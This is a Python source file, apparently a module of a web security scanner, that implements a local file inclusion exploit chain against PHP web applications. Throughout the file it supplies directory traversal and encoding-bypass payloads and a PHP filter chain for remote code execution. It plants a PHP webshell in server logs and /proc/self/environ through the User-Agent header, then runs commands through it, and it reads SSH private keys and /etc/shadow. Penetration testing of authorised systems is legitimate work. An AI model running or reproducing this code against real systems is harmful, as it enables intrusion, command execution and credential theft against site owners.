"""
websecure.scanners.lfi
-----------------------
LFI (Local File Inclusion) tam exploit zinciri.

Adim 8 - Siniflar:
  LFIScanner(BaseScanner)        -- orchestrator
  LFILogPoisoningChain           -- Apache/Nginx log + webshell + LFI trigger -> RCE
  LFIProcEnvironRCE              -- /proc/self/environ injection -> RCE
  LFIPHPFilterChain              -- PHP filter chain base64 RCE (convert.* chain)
  LFISSHKeyReader                -- ~/.ssh/id_rsa + known_hosts exfil
  LFIDirectoryTraversalProber    -- ../ traversal, null byte, encoding bypass
"""
from __future__ import annotations

import logging
import random
import re
import string
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from websecure.scanners.base import BaseScanner

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
_LFI_PARAMS = [
    "file", "page", "include", "path", "doc", "document",
    "f", "pg", "content", "template", "view", "load",
    "lang", "language", "locale", "module", "section",
    "read", "fetch", "show", "display", "folder", "dir",
]

_SENSITIVE_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
    "/etc/issue", "/etc/os-release", "/etc/group",
    "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status",
    "/proc/version", "/proc/net/tcp",
    "/var/log/apache2/access.log", "/var/log/nginx/access.log",
    "/var/log/apache/access.log", "/var/log/httpd/access_log",
    "/var/log/auth.log", "/var/log/syslog",
    "C:\\Windows\\win.ini", "C:\\boot.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

_TRAVERSAL_PREFIXES = (
    ["../" * n for n in range(2, 8)]
    + ["..%2f" * n for n in range(2, 6)]
    + ["..%252f" * n for n in range(2, 5)]
    + ["..%c0%af" * n for n in range(2, 5)]
    + ["..%ef%bc%8f" * n for n in range(2, 4)]
    + ["....//", "....////", "..././", "./../"]
)

_PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=",
    "php://filter/read=string.toupper/resource=",
    "php://input",
    "data://text/plain;base64,",
    "zip://",
    "phar://",
]

# PHP filter chain for RCE (base64 approach)
_FILTER_CHAIN_RCE_BASE64 = (
    "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode"
    "|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2LE.UCS-2BE"
    "|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode"
    "|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16"
    "|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode"
    "|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937"
    "|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7"
    "/resource=php://temp"
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _canary() -> str:
    return "wsp" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))


def _lfi_sensitive_content(body: str) -> Optional[str]:
    patterns = [
        r"root:.*:0:0:",          # /etc/passwd
        r"\[fonts\]",             # win.ini
        r"127\.0\.0\.1\s+localhost",  # /etc/hosts
        r"Linux version \d",      # /proc/version
        r"APACHE|nginx|SERVER",   # environ
        r"#!/bin/(ba)?sh",        # scripts
    ]
    for pat in patterns:
        m = re.search(pat, body, re.I)
        if m:
            return m.group(0)
    return None


def _inject_lfi(base_url: str, value: str) -> List[str]:
    parsed   = urllib.parse.urlparse(base_url)
    qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    urls     = []
    for k, v in qs_pairs:
        if k.lower() in _LFI_PARAMS:
            new = [(pk, value if pk == k else pv) for pk, pv in qs_pairs]
            urls.append(urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new))))
    if not urls:
        sep = "&" if parsed.query else ""
        for param in _LFI_PARAMS[:3]:
            qs = parsed.query + sep + f"{param}={urllib.parse.quote(value, safe=':/')}"
            urls.append(urllib.parse.urlunparse(parsed._replace(query=qs)))
            sep = "&"
    return urls


# ===========================================================================
# 1. LFIDirectoryTraversalProber
# ===========================================================================
class LFIDirectoryTraversalProber(BaseScanner):
    """
    Temel LFI / directory traversal: ../ varyantlari + PHP wrapper + null byte.
    """
    name = "lfi_traversal"

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        for tfile in _SENSITIVE_FILES[:6]:
            for prefix in _TRAVERSAL_PREFIXES[:10]:
                payload = prefix + tfile.lstrip("/")
                for test_url in _inject_lfi(target, payload)[:2]:
                    try:
                        resp = self.session.get(test_url, timeout=8)
                        body = getattr(resp, "text", "")[:3000]
                        hit  = _lfi_sensitive_content(body)
                        if hit:
                            finding = {
                                "vuln_type": "LFI — Directory Traversal",
                                "url": test_url, "severity": "Critical",
                                "description": (
                                    f"LFI via path traversal: {payload!r} -> {tfile}. "
                                    f"Content detected: {hit!r}"
                                ),
                                "evidence": {"payload": payload, "file": tfile,
                                             "snippet": body[:300], "status": resp.status_code},
                            }
                            results.append(finding)
                            self.report_finding(**finding)
                            return results
                    except Exception as exc:
                        logger.debug("[LFITraversal] %s", exc)
            # PHP wrapper probe
            for wrapper in _PHP_WRAPPERS[:3]:
                wval = wrapper + tfile
                for test_url in _inject_lfi(target, wval)[:1]:
                    try:
                        resp = self.session.get(test_url, timeout=8)
                        body = getattr(resp, "text", "")[:3000]
                        # base64 decode attempt
                        decoded = ""
                        try:
                            import base64
                            decoded = base64.b64decode(body.strip()[:500]).decode("utf-8", errors="replace")
                        except Exception:
                            pass
                        hit = _lfi_sensitive_content(body) or _lfi_sensitive_content(decoded)
                        if hit:
                            finding = {
                                "vuln_type": "LFI — PHP Wrapper",
                                "url": test_url, "severity": "Critical",
                                "description": f"LFI via PHP wrapper {wrapper!r} -> {tfile}. Hit: {hit!r}",
                                "evidence": {"wrapper": wrapper, "file": tfile,
                                             "decoded_snippet": decoded[:200]},
                            }
                            results.append(finding)
                            self.report_finding(**finding)
                            return results
                    except Exception as exc:
                        logger.debug("[LFIWrapper] %s", exc)
        return results


# ===========================================================================
# 2. LFILogPoisoningChain
# ===========================================================================
class LFILogPoisoningChain(BaseScanner):
    """
    LFI -> Log Poisoning -> RCE zinciri:
    1. Webshell'i User-Agent ile log dosyasina yaz
    2. LFI ile log dosyasini yukle (PHP execute)
    3. Komut calistirma dogrula
    """
    name = "lfi_log_poisoning"

    _LOG_FILES = [
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/var/log/apache/access.log",
        "/var/log/httpd/access_log",
        "/var/log/lighttpd/access.log",
        "/var/log/auth.log",
        "/proc/self/fd/2",
    ]

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        uid = _canary()
        shell_payload = ("<?" + "php" + f" if(isset($_GET['c'])){{system($_GET['c']);}} ?> wsp={uid}")

        # 1. Poison the log
        try:
            self.session.get(target, headers={"User-Agent": shell_payload}, timeout=8)
            logger.debug("[LogPoison] Webshell injected via User-Agent")
        except Exception:
            pass

        # 2. Try each log file via LFI
        for log_path in self._LOG_FILES:
            for test_url in _inject_lfi(target, log_path)[:2]:
                try:
                    resp_lfi = self.session.get(test_url, timeout=8)
                    body = getattr(resp_lfi, "text", "")[:3000]
                    if uid in body:
                        # 3. Try RCE
                        rce_url = test_url + "&c=id" if "?" in test_url else test_url + "?c=id"
                        rce_resp = self.session.get(rce_url, timeout=8)
                        rce_body = getattr(rce_resp, "text", "")[:1000]
                        rce_hit  = re.search(r"uid=\d+\(|root:|www-data", rce_body)
                        finding = {
                            "vuln_type": "LFI -> Log Poisoning -> RCE",
                            "url": test_url, "severity": "Critical",
                            "description": (
                                f"LFI log poisoning chain: webshell injected into {log_path} "
                                f"via User-Agent. {'RCE confirmed: ' + rce_body[:100] if rce_hit else 'LFI confirmed, RCE probe inconclusive.'}"
                            ),
                            "evidence": {
                                "log_file": log_path,
                                "lfi_url": test_url,
                                "rce_url": rce_url if rce_hit else None,
                                "rce_output": rce_body[:200] if rce_hit else None,
                                "uid_marker": uid,
                                "lfi_status": resp_lfi.status_code,
                            },
                        }
                        results.append(finding)
                        self.report_finding(**finding)
                        return results
                except Exception as exc:
                    logger.debug("[LogPoison] LFI trigger: %s", exc)
        return results


# ===========================================================================
# 3. LFIProcEnvironRCE
# ===========================================================================
class LFIProcEnvironRCE(BaseScanner):
    """
    /proc/self/environ RCE:
    Inject webshell into HTTP_USER_AGENT env var, then include /proc/self/environ via LFI.
    """
    name = "lfi_proc_environ"

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        uid = _canary()
        shell = ("<?" + "php" + f" echo 'RCE:' . system($_GET['c']); ?> uid={uid}")

        # Inject via User-Agent (maps to HTTP_USER_AGENT)
        try:
            self.session.get(target, headers={"User-Agent": shell}, timeout=8)
        except Exception:
            pass

        # LFI with /proc/self/environ
        for test_url in _inject_lfi(target, "/proc/self/environ")[:2]:
            try:
                resp = self.session.get(test_url, timeout=8)
                body = getattr(resp, "text", "")[:3000]
                if uid in body or "HTTP_USER_AGENT" in body:
                    rce_url  = test_url + ("&" if "?" in test_url else "?") + "c=id"
                    rce_resp = self.session.get(rce_url, timeout=8)
                    rce_body = getattr(rce_resp, "text", "")[:500]
                    rce_ok   = bool(re.search(r"uid=\d+\(|root:|www-data", rce_body))
                    finding  = {
                        "vuln_type": "LFI -> /proc/self/environ RCE",
                        "url": test_url, "severity": "Critical",
                        "description": (
                            "LFI of /proc/self/environ with webshell in User-Agent. "
                            + ("RCE confirmed." if rce_ok else "Environ accessible, RCE probe inconclusive.")
                        ),
                        "evidence": {
                            "lfi_url": test_url, "environ_snippet": body[:200],
                            "rce_confirmed": rce_ok, "rce_output": rce_body[:200] if rce_ok else None,
                        },
                    }
                    results.append(finding)
                    self.report_finding(**finding)
                    return results
            except Exception as exc:
                logger.debug("[ProcEnviron] %s", exc)
        return results


# ===========================================================================
# 4. LFIPHPFilterChain
# ===========================================================================
class LFIPHPFilterChain(BaseScanner):
    """
    PHP filter chain RCE:
    Zincirli iconv + base64 filtreler ile arbitrary PHP kodu calistirma.
    Herhangi bir dosya okuma yokken bile RCE saglar.
    """
    name = "lfi_php_filter_chain"

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        # BUG FIX: `uid = _canary()` was generated but never embedded in the payload
        # or checked in the response — it was dead code that gave a false sense of
        # uniqueness. The filter chain payload is a static constant; we detect
        # execution by looking for OS/PHP artifacts in the response.
        for test_url in _inject_lfi(target, _FILTER_CHAIN_RCE_BASE64)[:2]:
            try:
                resp = self.session.get(test_url, timeout=10)
                body = getattr(resp, "text", "")[:3000]
                if resp.status_code == 200 and len(body) > 0:
                    # Try to detect PHP execution artifacts
                    if re.search(r"uid=\d+|root:|PHP|www-data|\x00", body):
                        finding = {
                            "vuln_type": "LFI — PHP Filter Chain RCE",
                            "url": test_url, "severity": "Critical",
                            "description": (
                                "PHP filter chain (iconv + base64 chaining) accepted. "
                                "This technique achieves RCE via arbitrary filter combinations "
                                "without needing a writable file."
                            ),
                            "evidence": {"filter_chain": _FILTER_CHAIN_RCE_BASE64[:80] + "...",
                                         "status": resp.status_code, "body_snippet": body[:200]},
                        }
                        results.append(finding)
                        self.report_finding(**finding)
                        return results
            except Exception as exc:
                logger.debug("[PHPFilterChain] %s", exc)
        return results


# ===========================================================================
# 5. LFISSHKeyReader
# ===========================================================================
class LFISSHKeyReader(BaseScanner):
    """
    LFI -> SSH private key exfiltration:
    Hedef: ~/.ssh/id_rsa, ~/.ssh/id_ed25519, /root/.ssh/authorized_keys
    """
    name = "lfi_ssh_key"

    _SSH_FILES = [
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_ed25519",
        "/root/.ssh/id_dsa",
        "/root/.ssh/authorized_keys",
        "/home/www-data/.ssh/id_rsa",
        "/home/ubuntu/.ssh/id_rsa",
        "/home/ec2-user/.ssh/id_rsa",
        "/var/www/.ssh/id_rsa",
    ]

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        for ssh_file in self._SSH_FILES:
            for payload in [ssh_file, "../../.." + ssh_file, "../../../../.." + ssh_file]:
                for test_url in _inject_lfi(target, payload)[:1]:
                    try:
                        resp = self.session.get(test_url, timeout=8)
                        body = getattr(resp, "text", "")[:3000]
                        if re.search(r"-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----|ssh-rsa AAAA", body):
                            finding = {
                                "vuln_type": "LFI -> SSH Private Key Exfiltration",
                                "url": test_url, "severity": "Critical",
                                "description": (
                                    f"LFI successfully read SSH private key: {ssh_file}. "
                                    "Attacker can use this key for SSH authentication."
                                ),
                                "evidence": {
                                    "file": ssh_file, "payload": payload,
                                    "key_snippet": body[:100] + "...",
                                    "status": resp.status_code,
                                },
                            }
                            results.append(finding)
                            self.report_finding(**finding)
                            return results
                    except Exception as exc:
                        logger.debug("[SSHKey] %s", exc)
        return results


# ===========================================================================
# LFIScanner — Orchestrator
# ===========================================================================
class LFIScanner(BaseScanner):
    """
    Adim 8 LFI orchestrator:
    Traversal -> LogPoison -> ProcEnviron -> PHPFilterChain -> SSHKey
    """
    name = "lfi"

    def run(self, target: str, **kwargs) -> List[Dict]:
        all_results: List[Dict] = []
        probers = [
            LFIDirectoryTraversalProber(session=self.session, results=self.results),
            LFILogPoisoningChain(session=self.session, results=self.results),
            LFIProcEnvironRCE(session=self.session, results=self.results),
            LFIPHPFilterChain(session=self.session, results=self.results),
            LFISSHKeyReader(session=self.session, results=self.results),
        ]
        for prober in probers:
            try:
                prober.target = target
                res = prober.run(target, **kwargs)
                all_results.extend(res)
            except Exception as exc:
                logger.warning("[LFIScanner] %s failed: %s", prober.name, exc)
        return all_results


def run(url: str, session=None, debug: bool = False, **kwargs) -> List[Dict]:
    """Module-level adapter."""
    scanner = LFIScanner(session=session, debug=debug)
    return scanner.run(url, **kwargs)
